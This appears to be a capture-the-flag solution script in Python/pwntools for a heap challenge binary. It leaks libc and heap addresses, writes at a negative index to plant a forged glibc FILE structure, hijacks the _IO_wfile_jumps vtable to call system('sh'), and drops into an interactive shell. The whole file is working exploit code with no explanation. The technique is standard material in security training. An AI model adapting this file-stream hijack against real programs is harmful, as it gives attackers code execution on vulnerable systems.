from pwn import *
import subprocess

if args.LOCAL:
    p = remote("localhost", 1337)
    while True:
        try:
            pid = subprocess.run(["pgrep", "-fx", "/app/run"], check=True, capture_output=True, encoding="utf-8").stdout
            pid = int(pid)
            break
        except subprocess.CalledProcessError:
            log.warn("failed to get pid")
    gdb.attach(pid, gdbscript="b _IO_wfile_overflow\nc", exe="./chal", sysroot=f"/proc/{pid}/root/")
else:
    p = gdb.debug("./chal", gdbscript="c")

file = ELF("./chal", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def create(idx: int, size: int, data: bytes = b""):
    p.sendlineafter(b":", b"1")
    p.sendlineafter(b":", f"{idx}".encode())
    p.sendlineafter(b":", f"{size}".encode())
    p.sendafter(b":", data)

def delete(idx: int):
    p.sendlineafter(b":", b"2")
    p.sendlineafter(b":", f"{idx}".encode())

def view(idx: int):
    p.sendlineafter(b":", b"3")
    p.sendlineafter(b":", f"{idx}".encode())
    p.recvuntil(b": ")
    return p.recvline().strip()

create(0, 0x500, b"A" * 0x500)
create(1, 0x20, b"B" * 0x20)
delete(0)
create(2, 0, b"")
leak = view(2)
log.info(f"{leak = }")
leak = u64(leak.ljust(8, b"\0"))
log.info(f"{leak = :#x}")
libcbase = leak - 0x235150
log.info(f"{libcbase = :#x}")
libc.address = libcbase

create(3, 0, b"")
delete(3)
create(4, 0, b"")
leak = view(4)
log.info(f"{leak = }")
leak = u64(leak.ljust(8, b"\0"))
log.info(f"{leak = :#x}")
heapbase = (leak << 12) - 0x1000
log.info(f"{heapbase = :#x}")

wide_data = heapbase + 0x1060

loc = libc.bss() + 0x400 & ~0xFF

fake = bytearray()
fake += p32(0xFBAD6105)  # flags
fake += b"A;sh"  # 4 byte hole
fake += p64(loc)  # _IO_read_ptr
fake += p64(loc)  # _IO_read_end
fake += p64(0)  # _IO_read_base
fake += p64(0)  # _IO_write_base
fake += p64(loc)  # _IO_write_ptr
fake += p64(0)  # _IO_write_end
fake += p64(0)  # _IO_buf_base
fake += p64(loc)  # _IO_buf_end
fake += p64(0) * 3  # _IO_save_base, _IO_backup_base, _IO_save_end
fake += p64(0)  # _markers
fake += p64(0)  # _chain
fake += p32(1)  # _fileno
fake += p32(0)  # _flags2
fake += p64((1 << 64) - 1)  # _old_offset
fake += p16(0)  # _cur_column
fake += p8(0)  # _vtable_offset
fake += p8(0)  # _shortbuf
fake += p32(0)  # 4 byte hole
fake += p64(libc.sym._IO_stdfile_1_lock)  # _lock
fake += p64((1 << 64) - 1)  # _offset
fake += p64(0)  # _codecvt
fake += p64(wide_data)  # _wide_data
fake += p64(0)  # _freeres_list
fake += p64(0)  # _prevchain
fake += p32(0)  # _mode
fake += b"\x00" * 28  # _unused2
fake += p64(libc.sym._IO_wfile_jumps - 0x20)  # vtable
fake += p64(wide_data)  # _wide_vtable

fake[0x68 : 0x68 + 8] = p64(libc.sym.system)

create(-4, len(fake), fake)

p.interactive()